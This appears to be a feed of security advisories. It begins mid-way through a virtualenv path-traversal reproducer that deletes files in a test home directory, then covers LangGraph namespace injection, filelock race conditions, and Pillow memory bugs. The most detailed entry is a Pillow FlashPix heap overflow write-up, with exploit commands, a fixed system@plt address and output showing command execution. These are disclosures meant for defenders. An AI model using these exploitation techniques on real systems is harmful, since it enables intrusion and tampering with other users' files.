pip-1.0.dist-info before reinstall    P->>H: join entries without containment check    V->>H: remove Documents and notes.txt    V-->>A: virtualenv exits successfullyReproducer filesThe following files are from the scanner report for ANT-2026-SXOEHWP7. They were tested against commit a857a7823c73in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDsneed a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These filesare included as evidence and were not rerun for this advisory update.repro#!/usr/bin/env python3import osimport shutilimport subprocessimport sysfrom pathlib import Pathwork = Path("/tmp/repro-seed-uninstall")shutil.rmtree(work, ignore_errors=True)USER_FILES = ("Documents/thesis/chapter1.txt", "notes.txt")def make_home(name):    home = work / name    (home / "Documents" / "thesis").mkdir(parents=True)    (home / "Documents" / "thesis" / "chapter1.txt").write_text("months of work\n")    (home / "notes.txt").write_text("my notes\n")    return homedef unpack_attacker_project(home, top_level_line, record_line):    subprocess.run(        [sys.executable, "/tmp/repro.d/make_project_tree.py", home / "project", top_level_line, record_line],        check=True,    )def user_runs_virtualenv(home):    # HOME only gives each run its own ~ and app-data; --no-periodic-update keeps the run offline    result = subprocess.run(        ["virtualenv", "--no-periodic-update", ".venv"],        cwd=home / "project",        env={**os.environ, "HOME": str(home)},        stdout=subprocess.PIPE,        text=True,        check=True,    )    print(result.stdout, end="")def files_left(home):    return [f for f in USER_FILES if (home / f).exists()]# control: the project ships well-formed pip metadatacontrol_home = make_home("control")unpack_attacker_project(control_home, "pip", "pip/__init__.py,,")user_runs_virtualenv(control_home)control_left = files_left(control_home)print(f"CONTROL  user files still in ~ after virtualenv: {control_left}")# attack: site-packages is ~/project/.venv/lib/python3.X/site-packages, so five ".." is ~attack_home = make_home("attack")unpack_attacker_project(attack_home, "../../../../../Documents", "../../../../../notes.txt,,")print(f"BEFORE   user files in ~ before virtualenv: {files_left(attack_home)}")user_runs_virtualenv(attack_home)attack_left = files_left(attack_home)print(f"OBSERVED user files still in ~ after virtualenv: {attack_left}")# check: creati

items.title: [langgraph-checkpoint-postgres] LangGraph: Namespace labels containing `.` reach other namespaces in Postgres and SQLite stores
items.summary: SummaryThe Postgres and SQLite stores save a namespace as its labels joined with ., so ("tenant", "bob") and ("tenant.bob",) map to the same stored namespace. put rejected labels containing ., but get, search, delete, list_namespaces, their async versions, and ops passed directly to batch/abatch did not. A caller that could pass such a label could read, overwrite or delete items in another namespace.DetailsBaseStore checked namespace labels only in put/aput. The other methods passed the namespace on unchecked, and batch/abatch checked nothing, including the PutOp items inside them. PostgresStore, AsyncPostgresStore, SqliteStore and AsyncSqliteStore turn a namespace into text with ".".join(namespace), so a label containing . resolved to the namespace whose labels it spells out:get(("tenant.bob",), key), search(("tenant.bob",)) and list_namespaces(prefix=("tenant.bob",)) returned data stored under ("tenant", "bob").delete(("tenant.alice",), key) deleted the item stored under ("tenant", "alice").batch([PutOp(("tenant.bob",), key, value)]) overwrote the item stored under ("tenant", "bob").All releases of langgraph-checkpoint-postgres before 3.1.3 and langgraph-checkpoint-sqlite before 3.1.2 are affected. InMemoryStore compares namespaces as tuples and is not affected.ImpactYou may be affected if you use one of these stores, rely on namespaces to keep users or tenants apart, and let untrusted input choose a namespace label that reaches a read, delete or batch call. Such input could read, overwrite or delete another tenant's items. Labels written through put could never contain ., so no stored data becomes unreachable after upgrading.LangSmith Deployment: the HTTP store API already rejected such labels, but store calls made from graph code reached the same flaw. The Agent Server rejects these labels from versions 0.15.5 and 0.16.2. On LangSmith Cloud, new deployments and revisions already include the fix and existing deployments get it on their next revision; self-hosted deployments should upgrade.RemediationUpgrade to langgraph-checkpoint-postgres 3.1.3 or langgraph-checkpoint-sqlite 3.1.2. Both require langgraph-checkpoint 4.3.0, where get, search, delete and list_namespaces reject labels that are empty, are not strings, or contain . with InvalidNamespaceError, and the Postgres and SQLite stores apply the same check to every op passed to batch/abatch. Stores outside this repository that turn namespaces into delimited text can call langgraph.store.base.validate_op_namespace for each op they run.Referenceshttps://github.com/langchain-ai/langgraph/security/advisories/GHSA-6hmw-9432-67qqhttps://github.com/langchain-ai/langgraph/pull/9217https://github.com/langchain-ai/langgraph/commit/bfcfea554ed5c7f7be562cebf8825e911b493ab1https://github.com/langchain-ai/langgraph/releases/tag/checkpointpostgres%3D%3D3.1.3https://github.com/langchain-ai/langgraph/releases/tag/checkpointsqlite%3D%3D3.1.2https://github.com/advisories/GHSA-6hmw-9432-67qq

items.title: [filelock] filelock: SoftFileLock evicts a fresh lock file whose watched age another local user's pre-dated file passed on through inode reuse
items.summary: SoftFileLock and MarkerSoftFileLock evict an unparsable marker (the lock file at <path>, whose presence says a process holds the lock) once a waiting contender has watched it unchanged for two seconds. SoftFileLease expires a lease the same way. The watch tells two looks apart by the marker's modification time (mtime) and inode number (the kernel's identity for a file, independent of its name) alone.Another local user (the other user below) who can create files in the lock's directory, a sticky /tmp included (the sticky bit is a directory flag that lets only a file's owner remove it), parks an empty file of its own at the lock path. It dates that file to a future tick of the kernel's coarse clock (a clock that advances in steps of 4 ms), lets the waiters of the user running the lock (the lock user below) watch it past two seconds, and unlinks it in that tick. On a filesystem that hands a freed inode number straight back (ext4, overlayfs on ext4) the lock user's next marker repeats both values. It inherits the time spent watching the other user's file, and a second waiter removes it while its owner holds the lock.Two of the lock user's processes then run the critical section together with no error. A SoftFileLease waiter takes a live lease that its owner wrote moments before, within milliseconds instead of after lease_duration. Affected versions: filelock >= 4.1.0 and <= 4.2.0 (finding ANT-2026-RKC48J5B).SeverityCVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N, 4.7 (Medium).AV:L (local): the other user needs an account on the same host. AC:H (high attack complexity): a race the other user cannot steer. It needs ext4-style inode reuse, a coarse-clock timestamp tick the other user can predict, and two polls of the lock user inside a 4 ms tick and a ~75 µs create-to-write gap. The scanner measured 2 to 10 % of attempts; none of our own 250 attempts fired. PR:L (low privileges): an unprivileged account is enough. UI:N (no user interaction): the lock user's processes act on their own. C:N (no confidentiality impact): the other user reads nothing. I:H (high integrity impact): two holders write the data the lock protects, and neither learns of the other. A:N (no availability impact): the lock keeps working.Classification from the review: security, conditional, by mechanism. It is the same cross-UID primitive (a UID is a user account's numeric id) as the stale-break inode-reuse race reported in a separate advisory: an inode number reused after the other user's unlink in a sticky directory, which our review reproduced across UIDs, plus a forged future mtime. The scanner rated it high (CWE-694) and demonstrated it across UIDs in its own runs. It did not fire in 250 attempts of ours over ext4 with inode reuse confirmed, nor in the scanner-side triage, so its cross-user claim rests on the report's own runs and on the mechanism.Scope and preconditionsThe other user can create files in the lock's directory; a root-owned 1777 directory is enough. It creates, utimes (sets the timestamps of) and unlinks only its own file. In the sticky directory its unlink, rename, open(..., "w") and utime on a marker of the lock user all fail, and deleting its own file only frees the lock.The directory is on a filesystem that reuses a freed inode number at once: ext4, and overlayfs on it (thousands of create/unlink cycles returned one number). tmpfs does not reuse one, so the pair cannot repeat there; btrfs does not either.File timestamps come from a coarse clock whose future values the other user can compute (CLOCK_REALTIME_COARSE, 4 ms steps on Linux 6.1; 20,000 file creations all carried that clock's value).At least two processes of the lock user are waiting on the lock while the other user's file is there. The other user does not choose which processes overlap or when; each attempt blocks the lock for 2.2 s (for a lease, lease_duration).No symbolic link, hard link or FIFO takes part, so the fs.protected_* sysctls (Linux settings that restrict following links and opening pipes in sticky world-writable directories) play no part. StrictSoftFileLock keys its watch the same way but only raises SoftFileLockProtocolError, so it breaks no lock there.filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.Affected codeAt the scanned commit b831496, the watch is SoftFileLock._marker_unchanged_for, with its caller in _try_break_stale_lock. The MarkerSoftFileLock and SoftFileLease paths hand an unparsable marker to the same code. The re-check in break_lock_file compares the values the contender just read.Introduced0f7c4d3794dc ("fix(soft): expire leases on the contender's clock", #796, 2026-10-07), first released in 4.1.0

items.title: [filelock] filelock: SoftFileLock stale-break restore follows a swapped-in symbolic link and hard-links a file of the user running the lock into the lock directory
items.summary: When a soft-lock stale break finds that the marker (the lock file at <path>) it renamed aside was a live one recreated by a successor, the restore branch of break_lock_file() checks the break name with lstat (a check that reads a name without following a symbolic link) and then calls os.link(break_path, lock_file) by name. On CPython 3.12 and later on Linux (and on macOS) that call follows a symbolic link (a file that redirects to another path). A local user (the other user below) who can write a shared lock directory without the sticky bit (a directory flag that lets only a file's owner rename or remove it) replaces the break name with a symbolic link between those two calls.The SoftFileLock, MarkerSoftFileLock, SoftFileLease or lifetime break of the user running the lock (the lock user below) then creates a hard link (a second name for the same file), in that directory, to any of the lock user's own files on the same filesystem. That includes files inside directories the other user cannot enter and links that fs.protected_hardlinks (a Linux setting that forbids hard links to files one does not own) refuses the other user when it asks itself. The link exposes the file's size, times, mode and owner, keeps the inode (the kernel's identity for a file, independent of its name) alive, and gives the other user a name it can move. On 4.2.0 a later FileLock of the lock user on that name truncated the file. Affected versions: filelock >= 4.1.0 and <= 4.2.0 (finding ANT-2026-SB29HIAL).SeverityCVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N, 5.3 (Medium).AV:L (local): the other user needs an account on the same host. AC:H (high attack complexity): two short races against a few lines of Python, timed by inotify (a Linux facility that reports file events), and the lock user must take the lock again and again (the scanner won 10 runs out of 10 after 9 to 910 lock cycles). PR:L (low privileges): an unprivileged account is enough. UI:N (no user interaction): the lock user's process acts on its own. C:L (low confidentiality impact): the file's metadata through the new name, not its content. I:H (high integrity impact): the other user chooses the file, and whatever the lock user later does to names in that directory lands on it. On 4.2.0 the lock user's own FileLock truncated the 17-byte private file to 0 bytes and, with a permissive mode, would have changed its mode too. A:N (no availability impact): the lock keeps working.Classification from the review: security, conditional on a shared parent without the sticky bit, which crosses the protected-directory boundary. The scanner rated it high (CWE-363). This is an earlier-public-context finding. #786 added the restore branch and guarded a symbolic link already present when lstat runs, not one swapped in after it.Scope and preconditionsThe other user can write the lock directory, and it has no sticky bit: a 0777 or group-writable cache or project directory. In a root-owned 1777 directory the unprivileged lock user cannot rename the other user's marker and only waits. In a 1777 directory the lock user owns, fs.protected_symlinks=1 (a Linux setting that refuses to follow another user's symbolic link in a world-writable sticky directory) makes the link fail with EACCES (permission denied). Testing showed no effect in sticky directories.The interpreter's os.link follows symbolic links. CPython 3.14 on Linux issues linkat(..., AT_SYMLINK_FOLLOW). CPython 3.11 issues link(2), which links the symbolic link itself, and is not affected. The scanner did not test 3.12 and 3.13. On macOS link(2) follows (confirmed in our review on macOS 27.0.1: a plain os.link of a symbolic link gave the target st_nlink 2, that is two names).The target file and the lock directory are on the same filesystem (hard links cannot cross filesystems), and the lock user takes the lock more than once.Every soft-lock path reaches the branch: SoftFileLock, MarkerSoftFileLock, SoftFileLease and the lifetime break. The native FileLock does not, but it is the consumer that turns the planted link into a truncation.filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against. This finding is about what the lock itself adds inside such a directory, a hard link the other user cannot make on its own.Affected codeAt the scanned commit b831496, the restore branch of break_lock_file runs for SoftFileLock._try_break_stale_lock, MarkerSoftFileLock, SoftFileLease and the lifetime break. The truncation in UnixFileLock._finalize_locked_fd is what a later native lock on the planted name did to the file (reported in its own advisory).Introducedfc73fc51e137 ("fix(soft): restore a live marker a stale break move

items.title: [filelock] filelock ReadWriteLock: SQLite reopens the lock database by name, so a planted symlink or journal file makes the lock user's process overwrite or unlink its own files
items.summary: ReadWriteLock and AsyncReadWriteLock (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to /proc/self/fd/<n>, a Linux path that names the process's own open file n. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on -journal, -wal and -shm files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.Another local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a 0777 or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary read_lock() or write_lock() write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as /tmp a planted -wal file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the /proc/self/fd redirect since 4.0.9, the side-file variants since 3.20.4).Anthropic's OSS Scanner reported this in private as ANT-2026-KMJ2575J [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.SeverityCVSS 3.1 CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H scores 7.1 (High). AV:L (local): the other user needs an account on the same host. PR:L (low privileges): an ordinary account is enough. UI:N (no user interaction). AC:L (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. I:H (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. A:H (high availability impact): the other user makes every acquire fail or kills the lock holder. C:N (no confidentiality impact): the other user learns nothing. S:U (scope unchanged): the effect stays within the lock user's own privileges.Classification from the external review: conditional security, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.Scope and preconditionsThe other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a 0777 directory or a group-writable one (including a setgid 2775 project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is 0666. filelock itself creates the database 0600.Sticky directories (/tmp, /var/tmp, any 1777 directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with fs.protected_regular=2). What remains is a planted non-empty <db>-wal (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise sqlite3.OperationalError: disk I/O error. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if fs.protected_hardlinks=0.Two kernel settings matter. fs.protected_regular (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in /tmp, and SQLite follows a planted symlink itself (not tested). fs.protected_hardlinks=1 (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory.Platform and route. The /proc/self/fd redirect is Linux with /proc mounted, 4.0.9 and later. The side-file variants (-journal, -wal, -shm) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without /proc) they need the link-directory swap described under "Mechanism", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after

items.title: [pillow] Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution
items.summary: CreditsResearcher: Alex Bouffard (mixbo@pebwalker.com)SummaryA heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with Image.open(). The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional olefile dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).DetailsFpxImagePlugin decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.Image.open() auto-detects them from the OLE2 magic D0CF11E0... whenever the optional olefile package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.For a JPEG-compressed subimage (compression == 2), the plugin builds a "jpeg" decode tile and derives the (rawmode, jpegmode) pair from attacker-controlled FPX color IDs through the MODES table (src/PIL/FpxImagePlugin.py L25-L32):MODES = {    ...    (0x00018000, 0x00017FFE): ("RGBA", "LA"),                # rawmode "LA"  (2 bytes/pixel)    ...    (0x00020000, 0x00020001, 0x00020002): ("RGB", "YCC;P"),  # rawmode "YCC;P"}The Imaging output buffer for the tile is sized for the rawmode (here "LA" = 2 bytes/pixel) (src/decode.c L223-L226):state->bytes = (state->bits * state->xsize + 7) / 8;   // "LA" gives 2 * xsize bytes/row...state->buffer = (UINT8 *)calloc(1, state->bytes);In JpegDecode.c the rawmode string is mapped to a libjpeg out_color_space. Recognized modes (CMYK, YCbCr, YCbCrK, and so on) get a concrete colorspace, but "LA" and "YCC;P" are not recognized, so control reaches the fallback branch (src/libImaging/JpegDecode.c L219-L221):/* Disable decoder conversions. */context->cinfo.jpeg_color_space = JCS_UNKNOWN;context->cinfo.out_color_space  = JCS_UNKNOWN;Under JCS_UNKNOWN, libjpeg performs no color conversion and emits cinfo.num_components bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So jpeg_read_scanlines writes 4 * width bytes per row into a buffer allocated for only 2 * width bytes (src/libImaging/JpegDecode.c L252):ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);   // writes 4*W into a 2*W bufferThis is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about 2 * width bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python bytes object's ob_type with a pointer to a fake PyTypeObject / PyBufferProcs vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, PyBuffer_Release walks ob_type -> tp_as_buffer -> bf_releasebuffer and executes call *rax; the PoC points that at system@plt (fixed, the interpreter binary is non-PIE) with rdi set to the command string, yielding command execution.PoCTo facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from Annex A.The source code for the payload builder make_payload.py is in Annex B.vulnerable.py is the program under test, a one-liner that opens the file it is given:#!/usr/bin/env python3# The entire vulnerable operation an application performs on an untrusted file.import sysfrom PIL import ImageImage.open(sys.argv[1]).load()The payload is a standalone .fpx file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run make_payload.py inside the same container here purely for convenience, so its baked-in addresses (--offset, system@plt) match this pinned image. The payload redirects the hijacked indirect call to system@plt (0x4206c0, fixed because the interpreter binary is non-PIE) with a baked-in command:$ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx[control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0[control] opening it: vtable hijack -> call *0x4206c0 with rdi -> 'id'Then open it with vulnerable.py:$ python3 vulnerable.py shell.fpxuid=0(root) gid=0(root) groups=0(root)corrupted size vs. prev_sizeImage.open() of the crafted file runs the baked command via system("id"): command execution as the user running the image processing (root in the container).The trailing corrupted size vs. prev_size is glibc aborting during interpreter teardown over the corrupted heap, after id hasalready run.The builder writes the command inline at the hijacked rdi, so --cmd is limited to 7 bytes (for example id, id;w). --offset and system@plt are constants of the pinned, ASLR-disabled image and hold across runs of it.ImpactThis is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution.

items.title: [Pillow] Pillow: Arrow export leaks stale heap memory when PILLOW_ALIGNMENT > 1
items.summary: SummaryWhen PILLOW_ALIGNMENT is set above 1, exporting an image to Arrow returns uninitialized heap memory mixed in with the pixel data. That memory can include pixels from images the process freed earlier. DetailsWith an alignment above 1, the default allocator pads each row up to aligned_linesize and starts the first row at an aligned offset into the block. It then exports im->blocks[0].ptr as xsize * ysize tightly packed pixels, so exported data includes the padding bytes, and can include a few bytes from before the first row.Tested vulnerable on 11.2.1, 12.3.0, 4c1ed27a5.PoCWhether things leak may depend on allocator configuration. This does show a leak on my Mac.import osos.environ["PILLOW_ALIGNMENT"] = "64"from PIL import Image# Image A: 64 px wide, so its rows fill the whole aligned stridea = Image.new("L", (64, 40), 0x41).transpose(Image.Transpose.FLIP_LEFT_RIGHT)del a# Image B: 61 px wide, so each row has 3 bytes of padding; its pixels are all 0b = Image.new("L", (61, 40), 0).transpose(Image.Transpose.FLIP_LEFT_RIGHT)try:    exported = Image.fromarrow(b, b.mode, b.size).tobytes()except ValueError as e:    print("Not vulnerable:", e)else:    if leaked := len(exported) - exported.count(0):        raise RuntimeError(f"{leaked} of {len(exported)} exported bytes are not B's pixels")ImpactInformation disclosure for applications that set PILLOW_ALIGNMENT and export images to Arrow. Likely any image whose row length isn't a multiple of the alignment will do. In a service handling several users' images, one user's exported data can contain pixels from another user's image, or other stale heap contents.Referenceshttps://github.com/python-pillow/Pillow/security/advisories/GHSA-654x-cwwv-5j9chttps://nvd.nist.gov/vuln/detail/CVE-2026-114501https://github.com/python-pillow/Pillow/pull/10172https://github.com/python-pillow/Pillow/commit/19f64946eb247b973dd4560be7dea3bf979d2e6ahttps://github.com/python-pillow/Pillow/releases/tag/13.0.0https://github.com/advisories/GHSA-654x-cwwv-5j9c
